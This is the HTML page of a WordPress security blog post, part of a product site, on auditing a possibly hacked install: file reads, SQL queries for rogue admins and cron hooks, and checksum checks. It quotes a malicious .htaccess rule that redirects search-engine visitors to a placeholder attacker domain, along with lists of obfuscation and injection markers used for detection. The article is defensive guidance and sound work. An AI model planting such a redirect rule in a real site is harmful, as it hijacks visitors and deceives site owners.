@@ -1,0 +1,406 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+
+<title>Spotting a hacked WordPress install: a 5-minute audit · Pier — Blog</title>
+<meta name="description" content="You have FTP, the database password, and maybe five minutes before the client wakes up. Here is the audit that gets you to a verdict, in roughly that order.">
+<meta name="author" content="Pier editorial">
+<meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large,max-video-preview:-1">
+<meta name="keywords" content="wordpress, security, php, mysql, htaccess, operations">
+
+<link rel="canonical" href="https://pier.abn.company/blog/hacked-wordpress-five-minute-audit/">
+<link rel="alternate" hreflang="en" href="https://pier.abn.company/blog/hacked-wordpress-five-minute-audit/">
+<link rel="alternate" hreflang="nl" href="https://pier.abn.company/nl/blog/hacked-wordpress-five-minute-audit/">
+<link rel="alternate" hreflang="x-default" href="https://pier.abn.company/blog/hacked-wordpress-five-minute-audit/">
+<link rel="alternate" type="application/rss+xml" title="Pier — Blog" href="https://pier.abn.company/blog/feed.xml">
+
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="Pier">
+<meta property="og:title" content="Spotting a hacked WordPress install: a 5-minute audit">
+<meta property="og:description" content="You have FTP, the database password, and maybe five minutes before the client wakes up. Here is the audit that gets you to a verdict, in roughly that order.">
+<meta property="og:url" content="https://pier.abn.company/blog/hacked-wordpress-five-minute-audit/">
+<meta property="og:image" content="https://pier.abn.company/blog/hacked-wordpress-five-minute-audit/hero.jpg">
+<meta property="og:image:secure_url" content="https://pier.abn.company/blog/hacked-wordpress-five-minute-audit/hero.jpg">
+<meta property="og:image:type" content="image/jpeg">
+<meta property="og:image:width" content="2000">
+<meta property="og:image:height" content="1333">
+<meta property="og:image:alt" content="Brass machinist calipers on cream paper template with pencil tick marks and red wax checkmark, dark oak surface.">
+<meta property="og:locale" content="en_US">
+<meta property="og:locale:alternate" content="nl_NL">
+<meta property="article:published_time" content="2026-05-15T09:10:31.213Z">
+<meta property="article:modified_time" content="2026-05-15T09:10:31.213Z">
+<meta property="article:author" content="Pier editorial">
+<meta property="article:publisher" content="https://abn.company/">
+<meta property="article:section" content="Security">
+<meta property="article:tag" content="wordpress">
+<meta property="article:tag" content="security">
+<meta property="article:tag" content="php">
+<meta property="article:tag" content="mysql">
+<meta property="article:tag" content="htaccess">
+<meta property="article:tag" content="operations">
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:site" content="@JacobAbn">
+<meta name="twitter:creator" content="@JacobAbn">
+<meta name="twitter:title" content="Spotting a hacked WordPress install: a 5-minute audit">
+<meta name="twitter:description" content="You have FTP, the database password, and maybe five minutes before the client wakes up. Here is the audit that gets you to a verdict, in roughly that order.">
+<meta name="twitter:image" content="https://pier.abn.company/blog/hacked-wordpress-five-minute-audit/hero.jpg">
+<meta name="twitter:image:alt" content="Brass machinist calipers on cream paper template with pencil tick marks and red wax checkmark, dark oak surface.">
+<meta name="twitter:label1" content="Reading time">
+<meta name="twitter:data1" content="6 min read">
+<meta name="twitter:label2" content="Filed under">
+<meta name="twitter:data2" content="Security">
+
+<meta name="theme-color" content="#eeece6">
+<meta name="color-scheme" content="light">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-title" content="Pier">
+<meta name="format-detection" content="telephone=no">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+
+<link rel="icon" href="/favicon.svg" type="image/svg+xml">
+<link rel="alternate icon" href="/favicon.ico">
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+<link rel="mask-icon" href="/favicon.svg" color="#0d0d0d">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="preload" as="image" href="/blog/hacked-wordpress-five-minute-audit/hero.webp" type="image/webp" fetchpriority="high">
+<link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Geist:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Geist:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" media="print" onload="this.media='all'">
+<noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Geist:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap"></noscript>
+<link rel="stylesheet" href="/styles.css">
+
+<!-- JSON-LD: Organization (stable @id used by other graphs) -->
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"Organization",
+  "@id":"https://abn.company/#org",
+  "name":"A Brand New Company B.V.",
+  "alternateName":"ABN",
+  "url":"https://abn.company/",
+  "logo":{"@type":"ImageObject","url":"https://pier.abn.company/logo.svg","width":32,"height":32},
+  "taxID":"NL004626508B12",
+  "vatID":"NL004626508B12",
+  "identifier":[{"@type":"PropertyValue","propertyID":"KvK","value":"88565548"}],
+  "sameAs":[
+    "https://abn.company/",
+    "https://pier.abn.company/",
+    "https://twitter.com/JacobAbn",
+    "https://github.com/jacobabn"
+  ],
+  "address":{"@type":"PostalAddress","addressCountry":"NL","addressLocality":"Amsterdam"}
+}
+</script>
+
+<!-- JSON-LD: WebSite -->
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"WebSite",
+  "@id":"https://pier.abn.company/#website",
+  "url":"https://pier.abn.company/",
+  "name":"Pier",
+  "inLanguage":["en","nl"],
+  "publisher":{"@id":"https://abn.company/#org"}
+}
+</script>
+
+<!-- JSON-LD: BlogPosting -->
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"BlogPosting",
+  "@id":"https://pier.abn.company/blog/hacked-wordpress-five-minute-audit/#post",
+  "isPartOf":{"@id":"https://pier.abn.company/#website"},
+  "mainEntityOfPage":{"@type":"WebPage","@id":"https://pier.abn.company/blog/hacked-wordpress-five-minute-audit/"},
+  "url":"https://pier.abn.company/blog/hacked-wordpress-five-minute-audit/",
+  "headline":"Spotting a hacked WordPress install: a 5-minute audit",
+  "description":"You have FTP, the database password, and maybe five minutes before the client wakes up. Here is the audit that gets you to a verdict, in roughly that order.",
+  "image":{
+    "@type":"ImageObject",
+    "url":"https://pier.abn.company/blog/hacked-wordpress-five-minute-audit/hero.jpg",
+    "width":2000,
+    "height":1333,
+    "caption":"Brass machinist calipers on cream paper template with pencil tick marks and red wax checkmark, dark oak surface."
+  },
+  "datePublished":"2026-05-15T09:10:31.213Z",
+  "dateModified":"2026-05-15T09:10:31.213Z",
+  "author":{
+    "@type":"Person",
+    "name":"Jacob Molkenboer",
+    "url":"https://abn.company/",
+    "sameAs":["https://twitter.com/JacobAbn"]
+  },
+  "publisher":{"@id":"https://abn.company/#org"},
+  "inLanguage":"en",
+  "keywords":"wordpress, security, php, mysql, htaccess, operations",
+  "wordCount":1115,
+  "articleSection":"Security",
+  "articleBody":"The Slack ping lands at 23:41. A client's WordPress site is throwing a Google Safe Browsing warning, the agency lead is on a flight at 06:00, and you have the FTP creds and the database password sitting in 1Password. You don't have time to clone the site locally. You have maybe five minutes before the client texts. This is the audit I run, in roughly this order, on any WordPress site I suspect is compromised. It assumes shell or FTP access, MySQL access, and nothing else. No Wordfence subscription, no malware scanner running, no fresh backup. Just the live install and a terminal. The two files attackers touch first Start with the file system. In my own clean-up work, the vast majority of WordPress compromises leave traces in two places: wp-config.php and .htaccess . Read both. Don't grep them, read them top to bottom. In wp-config.php you're looking for anything above the opening <?php tag (PHP that runs before the standard config), anything that require s a file outside the WordPress install, or any base64_decode , gzinflate , eval , or str_rot13 calls. A clean wp-config has none of those. If you see a one-line obfuscated payload near the top of the file, you have your answer. In .htaccess , the signature is usually a conditional RewriteRule that fires only for search-engine referrers or specific user agents. The classic version looks like this: RewriteCond %{HTTP_REFERER} (google|bing|yahoo|yandex) [NC] RewriteCond %{HTTP_USER_AGENT} !(bot|crawl|spider) [NC] RewriteRule .* http://malicious-domain.tld/redirect.php [R=302,L] The site looks fine when you visit it directly. Only visitors arriving from a search result get redirected. That asymmetry is the whole point of the attack: it keeps the site looking healthy to the owner while monetising the SEO traffic. Apache's mod_rewrite documentation covers the conditional syntax if you want to confirm what each directive does. Four SQL queries against the live database Now the database. Open MySQL and run these four queries against the WordPress schema. Each one targets a different attacker persistence trick. 1. Admin users you didn't create SELECT ID, user_login, user_email, user_registered FROM wp_users ORDER BY user_registered DESC LIMIT 20; Look for accounts registered in the last 30 days that nobody on the team remembers creating. Cross-reference with wp_usermeta for users whose wp_capabilities meta value contains administrator . Attackers often create a second admin so that revoking the first one (or rotating the original admin password) doesn't lock them out. 2. Active plugins and scheduled tasks SELECT option_value FROM wp_options WHERE option_name = 'active_plugins'; SELECT option_value FROM wp_options WHERE option_name = 'cron'; Both results are serialized PHP arrays. Skim the active plugins list. Anything you don't recognise, anything with a generic name like wp-cache-helper or seo-tools , anything in a directory that doesn't match a plugin on the official WordPress.org plugin directory , gets a hard look. Then check wp-content/plugins/ on disk: most legitimate plugins ship with a readme.txt, a languages folder, a build directory. A single anonymous PHP file in its own slug folder is a red flag. The cron option lists every scheduled hook WordPress knows about. Attackers love wp-cron because it lets them schedule a payload that fires hourly with no visible admin UI. Hook names like wp_update_check_v2 or anything you can't trace to a plugin you recognise, treat as suspicious until proven otherwise. 3. Injected post content SELECT ID, post_title FROM wp_posts WHERE post_content LIKE '%<iframe%' OR post_content LIKE '%display:none%' OR post_content LIKE '%eval(base64%'; Spam link injections often live inside published posts, hidden behind a display:none div or an off-screen iframe. The post reads fine to a human visitor; only search engines index the hidden anchor text. The mu-plugins folder and the uploads directory Two folders WordPress will execute code from that most owners forget about: wp-content/mu-plugins/ and (when misconfigured) wp-content/uploads/ . Must-use plugins load automatically with no entry in the admin UI. There is no \"deactivate\" button. If mu-plugins/ exists and you didn't put a file in it, read every PHP file in there. It's the cleanest persistence mechanism an attacker can pick. The uploads directory should only contain media. If you find a .php file under wp-content/uploads/ , something is wrong. Run this from the WordPress root over SSH: find wp-content/uploads -name \"*.php\" -type f A clean install returns nothing. Any output is either a vulnerability (an upload form that didn't validate file extension) or an already-placed web shell. As a stopgap, drop an .htaccess file into the uploads directory containing php_flag engine off , then investigate the entry point. Core file integrity in 30 seconds If WP-CLI is on the server, this one command tells you whether any core file has been modified versus what shipped from WordPress.org: wp",
+  "potentialAction":[
+    {"@type":"ReadAction","target":["https://pier.abn.company/blog/hacked-wordpress-five-minute-audit/"]}
+  ]
+}
+</script>
+
+<!-- JSON-LD: BreadcrumbList -->
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"BreadcrumbList",
+  "itemListElement":[
+    {"@type":"ListItem","position":1,"name":"Pier","item":"https://pier.abn.company/"},
+    {"@type":"ListItem","position":2,"name":"Blog","item":"https://pier.abn.company/blog/"},
+    {"@type":"ListItem","position":3,"name":"Spotting a hacked WordPress install: a 5-minute audit","item":"https://pier.abn.company/blog/hacked-wordpress-five-minute-audit/"}
+  ]
+}
+</script>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "FAQPage",
+  "inLanguage": "en",
+  "mainEntity": [
+    {
+      "@type": "Question",
+      "name": "Can I run this audit without shell access?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Most of it, yes. The file reads work over SFTP, and the SQL queries work in phpMyAdmin or Adminer. Only the wp-cli checksum step needs shell or a managed-host equivalent."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "How fresh does the backup need to be?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Older than the earliest suspicious timestamp you found. If wp_users shows a rogue admin registered on May 1 and your only backup is from May 5, you're restoring a compromised site."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "Checksums pass but Google still flags the site. Now what?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Check the mail queue and the last 48 hours of access logs. The compromise may be in a plugin (not core), or the flag may be a stale Safe Browsing entry from a previous incident."
+      }
+    }
+  ]
+}
+</script>
+</head>
+<body>
+
+<a href="#main" class="skip-link">Skip to content</a>
+
+<nav class="nav" aria-label="Primary">
+  <div class="nav-inner">
+    <a href="/" class="brand" aria-label="Pier — home">
+      <svg viewBox="0 0 32 32" aria-hidden="true" fill="none">
+        <rect x="1" y="1" width="30" height="30" stroke="currentColor" stroke-width="1.5"/>
+        <line x1="6" y1="22" x2="26" y2="22" stroke="currentColor" stroke-width="1.5"/>
+        <line x1="16" y1="22" x2="16" y2="12" stroke="currentColor" stroke-width="1.5"/>
+        <rect x="13" y="9" width="6" height="6" fill="#c23d1f"/>
+      </svg>
+      <span>Pier</span>
+    </a>
+    <div class="nav-links">
+      <a href="/#features">Features</a>
+      <a href="/#playbook">Playbook</a>
+      <a href="/blog/">Blog</a>
+      <a href="/#pricing">Pricing</a>
+      <a href="/#faq">FAQ</a>
+    </div>
+    <div class="nav-ctas">
+      <a href="https://pier.abn.company/nl/blog/hacked-wordpress-five-minute-audit/" class="lang-switch" hreflang="nl" title="Nederlands">NL</a>
+      <a href="https://buy.stripe.com/cNicN67MZeXD3Gt0ui2Nq00" class="pier-buy btn sm">Buy — €199</a>
+    </div>
+  </div>
+</nav>
+
+<main id="main">
+
+<article class="post">
+  <header class="post-head">
+    <div class="shell">
+      <div class="rule">
+        <span>— Article —</span>
+        <span class="spacer"></span>
+        <span>№ 019</span>
+      </div>
+      <p class="eyebrow"><span class="n">019 —</span>Security</p>
+      <h1 class="display-l post-title">Spotting a hacked WordPress install: a 5-minute audit</h1>
+      <p class="lede post-lede">You have FTP, the database password, and maybe five minutes before the client wakes up. Here is the audit that gets you to a verdict, in roughly that order.</p>
+      <div class="post-meta">
+        <time datetime="2026-05-15T09:10:31.213Z">15 May 2026</time>
+        <span class="dotsep">·</span>
+        <span>6 min read</span>
+        <span class="dotsep">·</span>
+        <span>Pier editorial</span>
+      </div>
+    </div>
+  </header>
+
+  <figure class="post-hero">
+    <picture>
+      <source srcset="/blog/hacked-wordpress-five-minute-audit/hero.webp" type="image/webp">
+      <img src="/blog/hacked-wordpress-five-minute-audit/hero.jpg" alt="Brass machinist calipers on cream paper template with pencil tick marks and red wax checkmark, dark oak surface." width="2000" height="1333" loading="eager" fetchpriority="high" decoding="async">
+    </picture>
+    <figcaption class="hero-cap"><span>Hero · staged still</span><span>№ 019</span></figcaption>
+  </figure>
+
+  <div class="shell post-body-wrap">
+    <div class="post-body">
+      <p>The Slack ping lands at 23:41. A client's WordPress site is throwing a Google Safe Browsing warning, the agency lead is on a flight at 06:00, and you have the FTP creds and the database password sitting in 1Password. You don't have time to clone the site locally. You have maybe five minutes before the client texts.</p><p>This is the audit I run, in roughly this order, on any WordPress site I suspect is compromised. It assumes shell or FTP access, MySQL access, and nothing else. No Wordfence subscription, no malware scanner running, no fresh backup. Just the live install and a terminal.</p><h2>The two files attackers touch first</h2><p>Start with the file system. In my own clean-up work, the vast majority of WordPress compromises leave traces in two places: <code>wp-config.php</code> and <code>.htaccess</code>. Read both. Don't grep them, read them top to bottom.</p><p>In <code>wp-config.php</code> you're looking for anything above the opening <code>&lt;?php</code> tag (PHP that runs before the standard config), anything that <code>require</code>s a file outside the WordPress install, or any <code>base64_decode</code>, <code>gzinflate</code>, <code>eval</code>, or <code>str_rot13</code> calls. A clean wp-config has none of those. If you see a one-line obfuscated payload near the top of the file, you have your answer.</p><p>In <code>.htaccess</code>, the signature is usually a conditional <code>RewriteRule</code> that fires only for search-engine referrers or specific user agents. The classic version looks like this:</p><pre><code class="lang-apache">RewriteCond %{HTTP_REFERER} (google|bing|yahoo|yandex) [NC]
+RewriteCond %{HTTP_USER_AGENT} !(bot|crawl|spider) [NC]
+RewriteRule .* http://malicious-domain.tld/redirect.php [R=302,L]</code></pre><p>The site looks fine when you visit it directly. Only visitors arriving from a search result get redirected. That asymmetry is the whole point of the attack: it keeps the site looking healthy to the owner while monetising the SEO traffic. Apache's <a href="https://httpd.apache.org/docs/2.4/mod/mod_rewrite.html">mod_rewrite documentation</a> covers the conditional syntax if you want to confirm what each directive does.</p><h2>Four SQL queries against the live database</h2><p>Now the database. Open MySQL and run these four queries against the WordPress schema. Each one targets a different attacker persistence trick.</p><h3>1. Admin users you didn't create</h3><pre><code class="lang-sql">SELECT ID, user_login, user_email, user_registered
+FROM wp_users
+ORDER BY user_registered DESC
+LIMIT 20;</code></pre><p>Look for accounts registered in the last 30 days that nobody on the team remembers creating. Cross-reference with <code>wp_usermeta</code> for users whose <code>wp_capabilities</code> meta value contains <code>administrator</code>. Attackers often create a second admin so that revoking the first one (or rotating the original admin password) doesn't lock them out.</p><h3>2. Active plugins and scheduled tasks</h3><pre><code class="lang-sql">SELECT option_value FROM wp_options WHERE option_name = 'active_plugins';
+SELECT option_value FROM wp_options WHERE option_name = 'cron';</code></pre><p>Both results are serialized PHP arrays. Skim the active plugins list. Anything you don't recognise, anything with a generic name like <code>wp-cache-helper</code> or <code>seo-tools</code>, anything in a directory that doesn't match a plugin on the official <a href="https://wordpress.org/plugins/">WordPress.org plugin directory</a>, gets a hard look. Then check <code>wp-content/plugins/</code> on disk: most legitimate plugins ship with a readme.txt, a languages folder, a build directory. A single anonymous PHP file in its own slug folder is a red flag.</p><p>The cron option lists every scheduled hook WordPress knows about. Attackers love wp-cron because it lets them schedule a payload that fires hourly with no visible admin UI. Hook names like <code>wp_update_check_v2</code> or anything you can't trace to a plugin you recognise, treat as suspicious until proven otherwise.</p><h3>3. Injected post content</h3><pre><code class="lang-sql">SELECT ID, post_title FROM wp_posts
+WHERE post_content LIKE '%&lt;iframe%'
+   OR post_content LIKE '%display:none%'
+   OR post_content LIKE '%eval(base64%';</code></pre><p>Spam link injections often live inside published posts, hidden behind a <code>display:none</code> div or an off-screen iframe. The post reads fine to a human visitor; only search engines index the hidden anchor text.</p><h2>The mu-plugins folder and the uploads directory</h2><p>Two folders WordPress will execute code from that most owners forget about: <code>wp-content/mu-plugins/</code> and (when misconfigured) <code>wp-content/uploads/</code>.</p><p>Must-use plugins load automatically with no entry in the admin UI. There is no "deactivate" button. If <code>mu-plugins/</code> exists and you didn't put a file in it, read every PHP file in there. It's the cleanest persistence mechanism an attacker can pick.</p><p>The uploads directory should only contain media. If you find a <code>.php</code> file under <code>wp-content/uploads/</code>, something is wrong. Run this from the WordPress root over SSH:</p><pre><code class="lang-bash">find wp-content/uploads -name "*.php" -type f</code></pre><p>A clean install returns nothing. Any output is either a vulnerability (an upload form that didn't validate file extension) or an already-placed web shell. As a stopgap, drop an <code>.htaccess</code> file into the uploads directory containing <code>php_flag engine off</code>, then investigate the entry point.</p><h2>Core file integrity in 30 seconds</h2><p>If WP-CLI is on the server, this one command tells you whether any core file has been modified versus what shipped from WordPress.org:</p><pre><code class="lang-bash">wp core verify-checksums</code></pre><p>The command compares every file in <code>wp-admin/</code> and <code>wp-includes/</code> against the official checksums. A clean install reports <code>Success: WordPress installation verifies against checksums.</code> A compromised one lists the exact files that don't match. That output, combined with what you found in <code>wp-config.php</code> and <code>.htaccess</code>, is usually enough to know whether you're cleaning up or rebuilding from a backup.</p><aside class="callout">If <code>verify-checksums</code> flags files you didn't expect, don't delete them yet. Copy each modified file to a quarantine folder outside the web root first. You'll want them when you write the incident note for the client and (often) when you're trying to work out which plugin's vulnerability was the original entry point. Deleting the evidence is what makes the second compromise possible a week later.</aside><h2>What to do with the findings</h2><p>Five minutes gets you to a verdict, not a fix. If two or more of the checks above came back dirty, the site is compromised and the only safe path is to restore from a backup taken before the earliest suspicious timestamp, then patch whatever let them in. If everything came back clean and the site is still flagged, it's worth reading the server's mail queue and the last 48 hours of access logs before you assume Google is wrong.</p><p>When we built Pier, the chat editor we make for any <a href="/">legacy site</a>, we ran into this exact flow often enough that we wired the audit straight into the chat: point it at an FTP and a MySQL connection, ask whether the site is compromised, and it runs the file reads and the SQL queries above against the live install. Every file it touches goes into <a href="/#features">version history</a>, and the same <a href="/#database">MySQL editor</a> view lets you diff a row or a file against last week's state if you do end up cleaning.</p><p>The smallest thing to do today, even on a site you trust: read your own <code>wp-config.php</code> and your own <code>.htaccess</code> top to bottom, once. If you don't recognise every line, you have homework.</p>
+    </div>
+
+    <aside class="pullquote">Read wp-config.php and .htaccess top to bottom, run four SQL queries against wp_users, wp_options, and wp_posts, then verify core checksums.</aside>
+
+    
+<section class="post-faq" aria-label="Questions">
+  <p class="rule"><span>— Questions —</span><span class="spacer"></span></p>
+  
+    <div class="faq-item">
+      <p class="faq-q">Can I run this audit without shell access?</p>
+      <p class="faq-a">Most of it, yes. The file reads work over SFTP, and the SQL queries work in phpMyAdmin or Adminer. Only the wp-cli checksum step needs shell or a managed-host equivalent.</p>
+    </div>
+
+    <div class="faq-item">
+      <p class="faq-q">How fresh does the backup need to be?</p>
+      <p class="faq-a">Older than the earliest suspicious timestamp you found. If wp_users shows a rogue admin registered on May 1 and your only backup is from May 5, you&#39;re restoring a compromised site.</p>
+    </div>
+
+    <div class="faq-item">
+      <p class="faq-q">Checksums pass but Google still flags the site. Now what?</p>
+      <p class="faq-a">Check the mail queue and the last 48 hours of access logs. The compromise may be in a plugin (not core), or the flag may be a stale Safe Browsing entry from a previous incident.</p>
+    </div>
+</section>
+
+    <aside class="pier-card" aria-label="Try Pier">
+      <div class="pier-card-head">
+        <span class="stamp accent">Pier · v1.0</span>
+      </div>
+      <div class="pier-card-body">
+        <h3 class="display-m">Built for the kind of work in this post.</h3>
+        <p class="lede">Pier docks with any FTP/SFTP server and its MySQL database, then lets you edit by chat. Every change is versioned. Every undo is one click. €199 once, two Macs, 30-day refund.</p>
+        <div class="pier-card-ctas">
+          <a href="https://buy.stripe.com/cNicN67MZeXD3Gt0ui2Nq00" class="pier-buy btn">Buy Pier — €199 ↗</a>
+          <a href="/#download" class="btn ghost">Download free trial</a>
+        </div>
+      </div>
+    </aside>
+
+    <nav class="post-tags" aria-label="Filed under">
+      <span class="rule" style="margin:0">
+        <span>— Filed under —</span>
+        <span class="spacer"></span>
+      </span>
+      <ul>
+        <li><a href="/blog/?tag=wordpress">#wordpress</a></li>
+<li><a href="/blog/?tag=security">#security</a></li>
+<li><a href="/blog/?tag=php">#php</a></li>
+<li><a href="/blog/?tag=mysql">#mysql</a></li>
+<li><a href="/blog/?tag=htaccess">#htaccess</a></li>
+<li><a href="/blog/?tag=operations">#operations</a></li>
+      </ul>
+    </nav>
+
+    <nav class="post-related" aria-label="Related reading">
+      
+    <p class="rule"><span>— Related reading —</span><span class="spacer"></span></p>
+    <div class="related-grid">
+      <a class="post-card" href="https://pier.abn.company/blog/shared-cpanel-clients-field-guide/">
+    <span class="pc-img">
+      <picture>
+        <source srcset="/blog/shared-cpanel-clients-field-guide/hero.webp" type="image/webp">
+        <img src="/blog/shared-cpanel-clients-field-guide/hero.jpg" alt="Wooden card-index drawer half open on dark oak desk, brass label-holder, ivory cards, one raised with red ribbon tab." loading="lazy" decoding="async" width="640" height="427">
+      </picture>
+    </span>
+    <span class="pc-body">
+      <span class="pc-meta"><span class="pc-cat">Business</span><span>·</span><span>15 May 2026</span></span>
+      <h3>Shared cPanel clients: the four kinds and what they need</h3>
+      <span class="pc-lede">Most agency portfolios still have a shared cPanel tail. Four kinds of clients live on it, and spotting which one is in front of you shortens the rest of the conversation.</span>
+    </span>
+  </a>
+<a class="post-card" href="https://pier.abn.company/blog/web-root-audit-checklist/">
+    <span class="pc-img">
+      <picture>
+        <source srcset="/blog/web-root-audit-checklist/hero.webp" type="image/webp">
+        <img src="/blog/web-root-audit-checklist/hero.jpg" alt="Antique brass ship&#39;s bell on dark oak bracket mounted to bone plaster wall, red frayed cord knotted to clapper." loading="lazy" decoding="async" width="640" height="427">
+      </picture>
+    </span>
+    <span class="pc-body">
+      <span class="pc-meta"><span class="pc-cat">Security</span><span>·</span><span>15 May 2026</span></span>
+      <h3>Public web root: seven file types you should never expose</h3>
+      <span class="pc-lede">A WordPress install live since 2014 will tell you everything about itself if you know which seven files to ask for. None of them should be there.</span>
+    </span>
+  </a>
+    </div>
+    </nav>
+  </div>
+</article>
+
+</main>
+
+<footer class="footer">
+  <div class="shell">
+    <div class="footer-grid">
+      <div>
+        <div class="brand" style="margin-bottom:18px">
+          <svg viewBox="0 0 32 32" width="22" height="22" aria-hidden="true" fill="none">
+            <rect x="1" y="1" width="30" height="30" stroke="currentColor" stroke-width="1.5"/>
+            <line x1="6" y1="22" x2="26" y2="22" stroke="currentColor" stroke-width="1.5"/>
+            <line x1="16" y1="22" x2="16" y2="12" stroke="currentColor" stroke-width="1.5"/>
+            <rect x="13" y="9" width="6" height="6" fill="#c23d1f"/>
+          </svg>
+          <span>Pier</span>
+        </div>
+        <p style="max-width:320px; color:var(--muted); font-size:14px">AI for legacy websites. Native Mac app. Built by ABN in Amsterdam.</p>
+      </div>
+      <div>
+        <h4>Product</h4>
+        <a href="/#features">Features</a>
+        <a href="/#playbook">Playbook</a>
+        <a href="/blog/">Blog</a>
+        <a href="/#pricing">Pricing</a>
+        <a href="/#faq">FAQ</a>
+      </div>
+      <div>
+        <h4>Company</h4>
+        <a href="https://abn.company">ABN</a>
+        <a href="mailto:hello@pier.abn.company">Contact</a>
+        <a href="https://pier.abn.company/nl/blog/hacked-wordpress-five-minute-audit/">🇳🇱 Nederlands</a>
+      </div>
+      <div>
+        <h4>Legal</h4>
+        <a href="/#">Privacy</a>
+        <a href="/#">Terms</a>
+        <a href="/#">Security</a>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <span>© 2026 ABN Company · Made on a rainy day in Amsterdam</span>
+      <span class="sp"></span>
+      <span>N 52°22′ · E 04°54′</span>
+    </div>
+  </div>
+</footer>
+
+<script src="/site.js" defer></script>
+</body>
+</html>
